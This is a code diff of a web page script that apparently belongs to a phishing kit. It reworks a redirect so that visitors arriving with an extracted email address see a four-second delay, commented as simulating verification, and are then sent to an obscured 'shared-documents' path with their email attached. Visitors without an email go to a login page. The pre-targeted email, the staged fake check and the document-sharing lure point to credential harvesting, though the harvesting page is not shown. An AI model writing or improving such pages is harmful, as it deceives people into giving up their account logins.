@@ -105,15 +105,20 @@
       document.getElementById("turnstile-form").submit();
     }
 
-    // Redirect after 4 sec
+    // Redirect after verification (or delay)
     window.onload = function () {
-      setTimeout(() => {
-        if (extractedEmail) {
-          window.location.href = "login.html?u=" + encodeURIComponent(extractedEmail);
-        } else {
+      if (extractedEmail) {
+        // Redirect to shared-documents with the email parameter
+        setTimeout(() => {
+          const redirectUrl = `/shared-documents-39207fb292f2568236f329?u=${encodeURIComponent(extractedEmail)}`;
+          window.location.href = redirectUrl;
+        }, 4000);  // Delay redirect to simulate verification
+      } else {
+        // If no email, redirect to the login page
+        setTimeout(() => {
           window.location.href = "login.html";
-        }
-      }, 4000);
+        }, 4000);
+      }
     };
   </script>
 </body>
